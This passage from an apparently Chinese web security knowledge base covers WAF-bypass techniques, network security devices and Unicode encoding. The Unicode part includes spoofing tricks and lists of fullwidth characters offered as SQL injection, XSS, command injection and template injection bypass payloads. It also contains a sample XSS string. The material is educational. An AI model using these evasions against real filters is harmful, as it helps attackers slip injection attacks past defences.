<dt>等价替换</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>大小写变换</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">select</span></code> =&gt; <code class="docutils literal notranslate"><span class="pre">sEleCt</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;sCrIpt&gt;alert(1)&lt;/script&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>字符编码</dt>
<dd><ul class="first last">
<li>URL编码</li>
<li>十六进制编码</li>
<li>Unicode解析</li>
<li>Base64</li>
<li>HTML</li>
<li>JSFuck</li>
<li>其他编码格式</li>
</ul>
</dd>
</dl>
</li>
<li>等价函数</li>
<li>等价变量</li>
<li>关键字拆分</li>
<li>字符串操作</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>字符干扰</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>空字符</dt>
<dd><ul class="first last">
<li>NULL (x00)</li>
<li>空格</li>
<li>回车 (x0d)</li>
<li>换行 (x0a)</li>
<li>垂直制表 (x0b)</li>
<li>水平制表 (x09)</li>
<li>换页 (x0c)</li>
</ul>
</dd>
</dl>
</li>
<li>注释</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>特殊符号</dt>
<dd><ul class="first last">
<li>注释符</li>
<li>引号（反引号、单引号、双引号）</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>利用服务本身特点</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>替换可疑关键字为空</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">selselectect</span></code> =&gt; <code class="docutils literal notranslate"><span class="pre">select</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li>少见特性未在规则列表中</li>
</ul>
</div>
</div>
<div class="section" id="id13">
<h4>参考链接<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102">WAF攻防研究之四个层次Bypass WAF</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/368">我的WafBypass之道 SQL注入篇</a></li>
<li><a class="reference external" href="https://habr.com/en/company/dsec/blog/454592/">WAF through the eyes of hackers</a></li>
</ul>
</div>
</div>
<span id="document-misc/netdev"></span><div class="section" id="id1">
<h3>常见网络设备<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>防火墙<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>简介<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>防火墙指的是一个有软件和硬件设备组合而成、在内部网和外部网之间、专用网与公共网之间的界面上构造的保护屏障。它可通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现网络的安全保护。</p>
<p>防火墙可以分为网络层防火墙和应用层防火墙。网络层防火墙基于源地址和目的地址、应用、协议以及每个IP包的端口来作出通过与否的判断。应用层防火墙针对特别的网络应用服务协议即数据过滤协议，并且能够对数据包分析并形成相关的报告。</p>
</div>
<div class="section" id="id4">
<h5>主要功能<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>过滤进、出网络的数据</li>
<li>防止不安全的协议和服务</li>
<li>管理进、出网络的访问行为</li>
<li>记录通过防火墙的信息内容</li>
<li>对网络攻击进行检测与警告</li>
<li>防止外部对内部网络信息的获取</li>
<li>提供与外部连接的集中管理</li>
</ul>
</div>
<div class="section" id="id5">
<h5>下一代防火墙<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>主要是一款全面应对应用层威胁的高性能防火墙。可以做到智能化主动防御、应用层数据防泄漏、应用层洞察与控制、威胁防护等特性。
下一代防火墙在一台设备里面集成了传统防火墙、IPS、应用识别、内容过滤等功能既降低了整体网络安全系统的采购投入，又减去了多台设备接入网络带来的部署成本，还通过应用识别和用户管理等技术降低了管理人员的维护和管理成本。</p>
</div>
</div>
<div class="section" id="ids">
<h4>IDS<a class="headerlink" href="#ids" title="永久链接至标题">¶</a></h4>
<div class="section" id="id6">
<h5>简介<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>入侵检测即通过从网络系统中的若干关键节点收集并分析信息，监控网络中是否有违反安全策略的行为或者是否存在入侵行为。入侵检测系统通常包含3个必要的功能组件：信息来源、分析引擎和响应组件。</p>
<p>信息收集包括收集系统、网络、数据及用户活动的状态和行为。入侵检测利用的信息一般来自：系统和网络日志文件、非正常的目录和文件改变、非正常的程序执行这三个方面。</p>
<p>分析引擎对收集到的有关系统、网络、数据及用户活动的状态和行为等信息，是通过模式匹配、统计分析和完整性分析这三种手段进行分析的。前两种用于实时入侵检测，完整性分析用于事后分析。</p>
<p>告警与响应根据入侵性质和类型，做出相应的告警与响应。</p>
</div>
<div class="section" id="id7">
<h5>主要类型<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>IDS可以分为基于主机的入侵检测系统(HIDS)和基于网络的入侵检测系统(NIDS)。</p>
<p>基于主机的入侵检测系统是早期的入侵检测系统结构，通常是软件型的，直接安装在需要保护的主机上。其检测的目标主要是主机系统和系统本地用户，检测原理是根据主机的审计数据和系统日志发现可疑事件。</p>
<p>这种检测方式的优点主要有：信息更详细、误报率要低、部署灵活。这种方式的缺点主要有：会降低应用系统的性能；依赖于服务器原有的日志与监视能力；代价较大；不能对网络进行监测；需安装多个针对不同系统的检测系统。</p>
<p>基于网络的入侵检测方式是目前一种比较主流的监测方式，这类检测系统需要有一台专门的检测设备。检测设备放置在比较重要的网段内，不停地监视网段中的各种数据包，而不再是只监测单一主机。它对所监测的网络上每一个数据包或可疑的数据包进行特征分析，如果数据包与产品内置的某些规则吻合，入侵检测系统就会发出警报，甚至直接切断网络连接。目前，大部分入侵检测产品是基于网络的。</p>
<p>这种检测技术的优点主要有：能够检测那些来自网络的攻击和超过授权的非法访问；不需要改变服务器等主机的配置，也不会影响主机性能；风险低；配置简单。其缺点主要是：成本高、检测范围受局限；大量计算，影响系统性能；大量分析数据流，影响系统性能；对加密的会话过程处理较难；网络流速高时可能会丢失许多封包，容易让入侵者有机可乘；无法检测加密的封包；对于直接对主机的入侵无法检测出。</p>
</div>
</div>
<div class="section" id="ips">
<h4>IPS（入侵防御系统）<a class="headerlink" href="#ips" title="永久链接至标题">¶</a></h4>
<div class="section" id="id8">
<h5>简介<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>入侵防御系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p>
<p>串行部署的防火墙可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。旁路部署的IDS可以及时发现那些穿透防火墙的深层攻击行为，作为防火墙的有益补充，但是无法实时的阻断。</p>
<p>因此出现了基于IDS和防火墙联动的IPS：通过IDS来发现，通过防火墙来阻断。但由于迄今为止没有统一的接口规范，加上越来越频发的“瞬间攻击”（一个会话就可以达成攻击效果，如SQL注入、溢出攻击等），使得IDS与防火墙联动在实际应用中的效果不显著。</p>
</div>
<div class="section" id="id9">
<h5>主要类型<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<p>可以分为基于特征的IPS、基于异常的IPS、基于策略的IPS、基于协议分析的IPS。</p>
<p>基于特征的IPS是许多IPS解决方案中最常用的方法。把特征添加到设备中，可识别当前最常见的攻击。也被称为模式匹配IPS。特征库可以添加、调整和更新，以应对新的攻击。</p>
<p>基于异常的IPS也被称为基于行规的IPS。基于异常的方法可以用统计异常检测和非统计异常检测。</p>
<p>基于策略的IPS更关心的是是否执行组织的安保策略。如果检测的活动违反了组织的安保策略就触发报警。使用这种方法的IPS，要把安全策略写入设备之中。</p>
<p>基于协议分析的IPS与基于特征的方法类似。大多数情况检查常见的特征，但基于协议分析的方法可以做更深入的数据包检查，能更灵活地发现某些类型的攻击。</p>
</div>
</div>
<div class="section" id="id10">
<h4>安全隔离网闸<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<div class="section" id="id11">
<h5>简介<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<p>安全隔离网闸是使用带有多种控制功能的固态开关读写介质连接两个独立网络系统的信息安全设备。由于物理隔离网闸所连接的两个独立网络系统之间，不存在通信的物理连接、逻辑连接、信息传输命令、信息传输协议，不存在依据协议的信息包转发，只有数据文件的无协议“摆渡”，且对固态存储介质只有“读”和“写”两个命令。所以，物理隔离网闸从物理上隔离、阻断了具有潜在攻击可能的一切连接，使攻击者无法入侵、无法攻击、无法破坏，实现了真正的安全。</p>
</div>
<div class="section" id="id12">
<h5>主要功能<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<p>阻断网络的直接物理连接：物理隔离网闸在任何时刻都只能与非可信网络和可信网络上之一相连接，而不能同时与两个网络连接。</p>
<p>阻断网络的逻辑连接：物理隔离网闸不依赖操作系统、不支持TCP/IP协议。两个网络之间的信息交换必须将TCP/IP协议剥离，将原始数据通过P2P的非TCP/IP连接方式，通过存储介质的“写入”与“读出”完成数据转发。</p>
<p>安全审查：物理隔离网闸具有安全审查功能，即网络在将原始数据“写入”物理隔离网闸前，根据需要对原始数据的安全性进行检查，把可能的病毒代码、恶意攻击代码过滤掉。</p>
<p>原始数据无危害性：物理隔离网闸转发的原始数据，不具有攻击或对网络安全有害的特性。</p>
<p>管理和控制功能：建立完善的日志系统。</p>
<p>根据需要建立数据特征库：在应用初始化阶段，结合应用要求，提取应用数据的特征，形成用户特有的数据特征库，作为运行过程中数据校验的基础。当用户请求时，提取用户的应用数据，抽取数据特征和原始数据特征库比较，符合原始特征库的数据请求进入请求队列，不符合的返回用户，实现对数据的过滤。</p>
<p>根据需要提供定制安全策略和传输策略的功能：用户可以自行设定数据的传输策略，如：传输单位（基于数据还是基于任务）、传输间隔、传输方向、传输时间、启动时间等。</p>
<p>支持定时/实时文件交换；支持支持单向/双向文件交换；支持数字签名、内容过滤、病毒检查等功能。</p>
</div>
</div>
<div class="section" id="vpn">
<h4>VPN设备<a class="headerlink" href="#vpn" title="永久链接至标题">¶</a></h4>
<div class="section" id="id13">
<h5>简介<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<p>虚拟专用网络指的是在公用网络上建立专用网络的技术。之所以称为虚拟网主要是因为整个VPN网络的任意两个节点之间的连接并没有传统专网所需的端到端的物理链路，而是架构在公用网络服务商所提供的网络平台之上的逻辑网络，用户数据在逻辑链路中传输。</p>
</div>
<div class="section" id="id14">
<h5>常用技术<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<p>MPLS VPN：是一种基于MPLS技术的IP VPN，是在网络路由和交换设备上应用MPLS（多协议标记交换）技术，简化核心路由器的路由选择方式，利用结合传统路由技术的标记交换实现的IP虚拟专用网络（IP VPN）。MPLS优势在于将二层交换和三层路由技术结合起来，在解决VPN、服务分类和流量工程这些IP网络的重大问题时具有很优异的表现。因此，MPLS VPN在解决企业互连、提供各种新业务方面也越来越被运营商看好，成为在IP网络运营商提供增值业务的重要手段。MPLS VPN又可分为二层MPLS VPN（即MPLS L2 VPN）和三层MPLS VPN（即MPLS L3 VPN）。</p>
<p>SSL VPN：是以HTTPS（SecureHTTP，安全的HTTP，即支持SSL的HTTP协议）为基础的VPN技术，工作在传输层和应用层之间。SSL VPN充分利用了SSL协议提供的基于证书的身份认证、数据加密和消息完整性验证机制，可以为应用层之间的通信建立安全连接。SSL VPN广泛应用于基于Web的远程安全接入，为用户远程访问公司内部网络提供了安全保证。</p>
<p>IPSecVPN是基于IPSec协议的VPN技术，由IPSec协议提供隧道安全保障。IPSec是一种由IETF设计的端到端的确保基于IP通讯的数据安全性的机制。它为Internet上传输的数据提供了高质量的、可互操作的、基于密码学的安全保证。</p>
</div>
</div>
<div class="section" id="id15">
<h4>安全审计系统<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h4>
<div class="section" id="id16">
<h5>简介<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h5>
<p>网络安全审计系统针对互联网行为提供有效的行为审计、内容审计、行为报警、行为控制及相关审计功能。从管理层面提供互联网的有效监督，预防、制止数据泄密。满足用户对互联网行为审计备案及安全保护措施的要求，提供完整的上网记录，便于信息追踪、系统安全管理和风险防范。</p>
</div>
</div>
<div class="section" id="id17">
<h4>参考链接<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://wenku.baidu.com/view/2b5540cca32d7375a517806a.html">网络安全设备</a></li>
</ul>
</div>
</div>
<span id="document-misc/unicode"></span><div class="section" id="unicode">
<h3>Unicode<a class="headerlink" href="#unicode" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>基本概念<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="bmp">
<h5>BMP<a class="headerlink" href="#bmp" title="永久链接至标题">¶</a></h5>
<p>BMP (Basic Multilingual Plane)，译作基本多文种平面，是Unicode中的一个编码区块。</p>
</div>
<div class="section" id="id2">
<h5>码平面<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>Unicode编码点分为17个平面（plane），每个平面包含2^16（即65536）个码位。17个平面的码位可表示为从U+xx0000到U+xxFFFF，其中xx表示十六进制值从0016到1016，共计17个平面。</p>
</div>
<div class="section" id="code-point">
<h5>Code Point<a class="headerlink" href="#code-point" title="永久链接至标题">¶</a></h5>
<p>Code Point也被称作Code Position，译作码位或编码位置，是指组成代码空间的数值。</p>
</div>
<div class="section" id="code-unit">
<h5>Code Unit<a class="headerlink" href="#code-unit" title="永久链接至标题">¶</a></h5>
<p>指某种 Unicode 编码方式里编码一个 Code Point 需要的最少字节数，比如 UTF-8 需要最少一个字节，UTF-16 最少两个字节，UCS-2 两个字节，UCS-4 和 UTF-32 四个字节。</p>
</div>
<div class="section" id="surrogate-pair">
<h5>Surrogate Pair<a class="headerlink" href="#surrogate-pair" title="永久链接至标题">¶</a></h5>
<p>Surrogate Pair 是用于 UTF-16 的以向后兼容 UCS-2 的，做法是取 UCS-2 范围里的 0xD800~0xDBFF (称为 high surrogates) 和 0xDC00~0xDFFF (称为 low surrogates) 的码位，一个 high surrogate 接一个 low surrogate 拼成四个字节表示超出 BMP 的字符，两个 surrogate range 都是 1024 个码位，所以 surrogate pair 可以表达 1024 x 1024 = 1048576 = 0x100000 个字符。</p>
</div>
<div class="section" id="combining-character">
<h5>Combining Character<a class="headerlink" href="#combining-character" title="永久链接至标题">¶</a></h5>
<p>例如 <code class="docutils literal notranslate"><span class="pre">He̊llö</span></code> 含有重音符号之类的字符，进行组合会使用大量的码位。所以这种字符多用组合的方式来实现。</p>
</div>
<div class="section" id="bom">
<h5>BOM<a class="headerlink" href="#bom" title="永久链接至标题">¶</a></h5>
<p>字节顺序标记（byte-order mark，BOM）是一个有特殊含义的统一码字符，码点为 <code class="docutils literal notranslate"><span class="pre">U+FEFF</span></code> 。当以UTF-16或UTF-32来将UCS字符所组成的字符串编码时，这个字符被用来标示其字节序。常被用于区分是否为UTF编码。</p>
</div>
</div>
<div class="section" id="id3">
<h4>编码方式<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="ucs-2">
<h5>UCS-2<a class="headerlink" href="#ucs-2" title="永久链接至标题">¶</a></h5>
<p>UCS-2 (2-byte Universal Character Set)是一种定长的编码方式，UCS-2仅仅简单的使用一个16位码元来表示码位，也就是说编码范围在0到0xFFFF的码位范围内。</p>
</div>
<div class="section" id="utf-8">
<h5>UTF-8<a class="headerlink" href="#utf-8" title="永久链接至标题">¶</a></h5>
<p>UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度字符编码，也是一种前缀码。它可以用一至四个字节对Unicode字符集中的所有有效编码点进行编码，属于Unicode标准的一部分。编码方式如下</p>
<table border="1" class="docutils">
<colgroup>
<col width="11%" />
<col width="10%" />
<col width="11%" />
<col width="10%" />
<col width="10%" />
<col width="10%" />
<col width="10%" />
<col width="10%" />
<col width="10%" />
<col width="10%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">码点的位数</th>
<th class="head">码点起值</th>
<th class="head">码点终值</th>
<th class="head">字节序列</th>
<th class="head">Byte 1</th>
<th class="head">Byte 2</th>
<th class="head">Byte 3</th>
<th class="head">Byte 4</th>
<th class="head">Byte 5</th>
<th class="head">Byte 6</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>7</td>
<td>U+0000</td>
<td>U+007F</td>
<td>1</td>
<td>0xxxxxxx</td>
<td>&#160;</td>
<td>&#160;</td>
<td>&#160;</td>
<td>&#160;</td>
<td>&#160;</td>
</tr>
<tr class="row-odd"><td>11</td>
<td>U+0080</td>
<td>U+07FF</td>
<td>2</td>
<td>110xxxxx</td>
<td>10xxxxxx</td>
<td>&#160;</td>
<td>&#160;</td>
<td>&#160;</td>
<td>&#160;</td>
</tr>
<tr class="row-even"><td>16</td>
<td>U+0800</td>
<td>U+FFFF</td>
<td>3</td>
<td>1110xxxx</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
<td>&#160;</td>
<td>&#160;</td>
<td>&#160;</td>
</tr>
<tr class="row-odd"><td>21</td>
<td>U+10000</td>
<td>U+1FFFFF</td>
<td>4</td>
<td>11110xxx</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
<td>&#160;</td>
<td>&#160;</td>
</tr>
<tr class="row-even"><td>26</td>
<td>U+200000</td>
<td>U+3FFFFFF</td>
<td>5</td>
<td>111110xx</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
<td>&#160;</td>
</tr>
<tr class="row-odd"><td>31</td>
<td>U+4000000</td>
<td>U+7FFFFFFF</td>
<td>6</td>
<td>1111110x</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
<td>10xxxxxx</td>
</tr>
</tbody>
</table>
</div>
<div class="section" id="utf-16">
<h5>UTF-16<a class="headerlink" href="#utf-16" title="永久链接至标题">¶</a></h5>
<p>UTF-16 (16-bit Unicode Transformation Format)是UCS-2的拓展，用一个或者两个16位的码元来表示码位，可以对0到0x10FFFF的码位进行编码。</p>
</div>
</div>
<div class="section" id="id4">
<h4>等价性问题<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<div class="section" id="id5">
<h5>简介<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>Unicode（统一码）包含了许多特殊字符，为了使得许多现存的标准能够兼容，提出了Unicode等价性（Unicode equivalence）。在字符中，有些在功能上会和其它字符或字符序列等价。因此，Unicode将一些码位序列定义成相等的。</p>
<p>Unicode提供了两种等价概念：标准等价和兼容等价。前者是后者的一个子集。例如，字符n后接着组合字符 <cite>~</cite> 会（标准和兼容）等价于Unicode字符ñ。而合字ﬀ则只有兼容等价于两个f字符。</p>
<p>Unicode正规化是文字正规化的一种形式，是指将彼此等价的序列转成同一列序。此序列在Unicode标准中称作正规形式。</p>
<p>对于每种等价概念，Unicode又定义两种形式，一种是完全合成的，一种是完全分解的。因此，最后会有四种形式，其缩写分别为：NFC、NFD、NFKC、NFKD。对于Unicode的文字处理程序而言，正规化是很重要的。因为它影响了比较、搜索和排序的意义。</p>
</div>
<div class="section" id="id6">
<h5>标准等价<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>统一码中标准等价的基础概念为字符的组成和分解的交互使用。合成指的是将简单的字符合并成较少的预组字符的过程，如字符n和组合字符 <cite>~</cite> 可以组成统一码ñ。分解则是反向过程，即将预组字符变回部件。</p>
<p>标准等价是指保持视觉上和功能上的等价。例如，含附加符号字母被视为和分解后的字母及其附加符号是标准等价。换句话说，预组字符‘ü’和由‘u’及 ‘¨’所组成的序列是标准等价。相似地，统一码统合了一些希腊附加符号和外观与附加符号类似的标点符号。</p>
</div>
<div class="section" id="id7">
<h5>兼容等价<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>兼容等价的范围较标准等价来得广。如果序列是标准等价的话就会是兼容等价，反之则未必对。兼容等价更关注在于纯文字的等价，并把一些语义上的不同形式归结在一起。</p>
<p>例如，上标数字和其所使用的数字是兼容等价，但非标准等价。其理由为下标和上标形式虽然在某些时侯属于不同意义，但若应用程序将他们视为一样也是合理的（虽然视觉上可区分）。如此，在统一码富文件中，上标和下标就可以以比较不累赘地方式出现（见下一节）。</p>
<p>全角和半角的片假名也是一种兼容等价但不是标准等价。如同合字和其部件序列。其只有视觉上但没有语义上的区别。换句话说，作者通常没有特别宣称使用合字是一种意思，而不使用是另一种意思。相对地，这尽限于印刷上的选择。</p>
<p>文字处理软件在实现统一码字符串的搜索和排序时，须考虑到等价性的存在。如果没有此特性的话，用户在搜索时将无法找到在视觉上无法区分的字形。</p>
<p>统一码提供了一个标准的正规化算法，可将所有相同的序列产生一个唯一的序列。 其等价准绳可以为标准的（NF）或兼容的（NFK）。 既然可以任意选择等价类中的元素，对每一个等价标准有多个标准形式也是有可能的。 统一码为每一种等价准绳分别提供两种正规形式：合成用的NFC和NFKC以及分解用的NFD和NFKD。 而不论是组合的或分解的形式，都会使用标准顺序，以此限制正规形式只有唯一形式。</p>
</div>
<div class="section" id="id8">
<h5>正规化<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>为了比较或搜索统一码字符串，软件可以使用合成或分解形式其中之一。 只要被比较或搜索的字符串使用的形式是相同的，哪种选择都没关系。 另一方面，等价概念的选择则会影响到搜索结果。 譬如，有些合字如ﬃ（U+FB03）、罗马数字如Ⅸ（U+2168），甚至是上标数字如⁵（U+2075）有其个别统一码码位。 标准正规形式并不会影响这些结果。 但兼容正规形式会分解ﬃ成f、f、i。所以搜索U+0066（f）时，在NFKC中会成功，但在NFC则会失败。 同样地有在预组罗马数字Ⅸ 中搜索拉丁字母I（U+0049）。类似地，“⁵”会转成“5”。</p>
<p>对于浏览器，将上标转换成到基下划线未必是好的，因为上标的信息会因而消失。为了允许这种不同，统一码字符数据库句含了兼容格式标签，其提供了兼容转换的细节。在合字的情况下，这个标签只是 <code class="docutils literal notranslate"><span class="pre">&lt;compat&gt;</span></code> ，而在上标的情况下则为 <code class="docutils literal notranslate"><span class="pre">&lt;super&gt;</span></code> 。丰富文件格式如超文本置标语言则会使用兼容标签。例如，HTML使用自定义标签来将“5”放到上标位置。</p>
</div>
<div class="section" id="id9">
<h5>正规形式<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>NFD Normalization Form Canonical Decomposition 以标准等价方式来分解</li>
<li>NFC Normalization Form Canonical Composition 以标准等价方式来分解，然后以标准等价重组之。若是singleton的话，重组结果有可能和分解前不同。</li>
<li>NFKD Normalization Form Compatibility Decomposition  以兼容等价方式来分解NFKC</li>
<li>Normalization Form Compatibility Composition 以兼容等价方式来分解，然后以标准等价重组之</li>
</ul>
</div>
</div>
<div class="section" id="tricks">
<h4>Tricks<a class="headerlink" href="#tricks" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>部分语言的长度并不是字符的长度，一个UTF-16可能是两位。</li>
<li>部分语言在翻转UTF-16等多字节编码时，会处理错误。</li>
</ul>
</div>
<div class="section" id="id10">
<h4>安全问题<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<div class="section" id="visual-spoofing">
<h5>Visual Spoofing<a class="headerlink" href="#visual-spoofing" title="永久链接至标题">¶</a></h5>
<p>例如bаidu.com(此处的a为u0430)和baidu.com(此处的a为x61)视觉上相同，但是实际上指向两个不同的域名。</p>
<p>bａidu.com(此处的a为uff41)和baidu.com(此处的a为x61)有一定的不同，但是指向两个相同的域名。</p>
<p>这种现象可以引起一些Spoofing或者WAF Bypass的问题。</p>
</div>
<div class="section" id="best-fit">
<h5>Best Fit<a class="headerlink" href="#best-fit" title="永久链接至标题">¶</a></h5>
<p>如果两个字符前后编码不同，之前的编码在之后的编码没有对应，程序会尝试找最佳字符进行自动转换。</p>
<p>当宽字符变成了单字节字符，字符编码会有一定的变化。</p>
<p>这种现象可能引起一些WAF Bypass。</p>
</div>
<div class="section" id="syntax-spoofing">
<h5>Syntax Spoofing<a class="headerlink" href="#syntax-spoofing" title="永久链接至标题">¶</a></h5>
<p>以下四个Url在语法上看来是没问题的域名，但是用来做分割的字符并不是真正的分割字符，而是U+2044( ⁄ )，可以导致一些UI欺骗的问题。</p>
<ul class="simple">
<li><a class="reference external" href="http://macchiato.com/x.bad.com">http://macchiato.com/x.bad.com</a>  macchiato.com/x     bad.com</li>
<li><a class="reference external" href="http://macchiato.com?x.bad.com">http://macchiato.com?x.bad.com</a>  macchiato.com?x     bad.com</li>
<li><a class="reference external" href="http://macchiato.com.x.bad.com">http://macchiato.com.x.bad.com</a>  macchiato.com.x     bad.com</li>
<li><a class="reference external" href="http://macchiato.com#x.bad.com">http://macchiato.com#x.bad.com</a>  macchiato.com#x     bad.com</li>
</ul>
</div>
<div class="section" id="punycode-spoofs">
<h5>Punycode Spoofs<a class="headerlink" href="#punycode-spoofs" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http:/">http:/</a>/䕮䕵䕶䕱.com        <a class="reference external" href="http://xn--google.com">http://xn--google.com</a></li>
<li><a class="reference external" href="http:/">http:/</a>/䁾.com              <a class="reference external" href="http://xn--cnn.com">http://xn--cnn.com</a></li>
<li><a class="reference external" href="http:/">http:/</a>/岍岊岊岅岉岎.com    <a class="reference external" href="http://xn--citibank.com">http://xn--citibank.com</a></li>
</ul>
<p>有些浏览器会直接显示puncode，但是也可以借助这种机制实现UI Spooof。</p>
</div>
<div class="section" id="buffer-overflows">
<h5>Buffer Overflows<a class="headerlink" href="#buffer-overflows" title="永久链接至标题">¶</a></h5>
<p>在编码转换的时候，有的字符会变成多个字符，如Fluß → FLUSS → fluss这样可能导致BOF。</p>
</div>
</div>
<div class="section" id="id11">
<h4>常见载荷<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<div class="section" id="url">
<h5>URL<a class="headerlink" href="#url" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">‥</span></code> (U+2025)</li>
<li><code class="docutils literal notranslate"><span class="pre">︰</span></code> (U+FE30)</li>
<li><code class="docutils literal notranslate"><span class="pre">。</span></code> (U+3002)</li>
<li><code class="docutils literal notranslate"><span class="pre">⓪</span></code>  (U+24EA)</li>
<li><code class="docutils literal notranslate"><span class="pre">／</span></code> (U+FF0F)</li>
<li><code class="docutils literal notranslate"><span class="pre">ｐ</span></code> (U+FF50)</li>
<li><code class="docutils literal notranslate"><span class="pre">ʰ</span></code> (U+02B0)</li>
<li><code class="docutils literal notranslate"><span class="pre">ª</span></code> (U+00AA)</li>
</ul>
</div>
<div class="section" id="sql">
<h5>SQL注入<a class="headerlink" href="#sql" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">＇</span></code> (U+FF07)</li>
<li><code class="docutils literal notranslate"><span class="pre">＂</span></code> (U+FF02)</li>
<li><code class="docutils literal notranslate"><span class="pre">﹣</span></code> (U+FE63)</li>
</ul>
</div>
<div class="section" id="xss">
<h5>XSS<a class="headerlink" href="#xss" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">＜</span></code> (U+FF1C)</li>
<li><code class="docutils literal notranslate"><span class="pre">＂</span></code> (U+FF02)</li>
</ul>
</div>
<div class="section" id="id12">
<h5>命令注入<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">＆</span></code> (U+FF06)</li>
<li><code class="docutils literal notranslate"><span class="pre">｜</span></code> (U+FF5C)</li>
</ul>
</div>
<div class="section" id="id13">
<h5>模板注入<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">﹛</span></code> (U+FE5B)</li>
<li><code class="docutils literal notranslate"><span class="pre">［</span></code> (U+FF3B)</li>
</ul>
</div>
</div>
<div class="section" id="id14">
<h4>参考链接<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h4>
<div class="section" id="id15">
<h5>官方文档<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://en.wikipedia.org/wiki/Unicode_equivalence">Unicode equivalence</a></li>
<li><a class="reference external" href="http://unicode.org/reports/tr15/">Unicode Normalization Forms</a></li>
<li><a class="reference external" href="http://unicode.org/reports/tr36/">Unicode Security Considerations</a></li>
</ul>
</div>
<div class="section" id="rfc">
<h5>RFC<a class="headerlink" href="#rfc" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://tools.ietf.org/html/rfc3629">RFC 3629</a> UTF-8, a transformation format of ISO 10646</li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2044">RFC 2044</a> UTF-8, a transformation format of ISO 10646</li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2279">RFC 2279</a> UTF-8, a transformation format of ISO 10646</li>
</ul>
</div>
<div class="section" id="tricks-blogs">
<h5>Tricks / Blogs<a class="headerlink" href="#tricks-blogs" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://en.wikipedia.org/wiki/IDN_homograph_attack">IDN homograph attack</a></li>
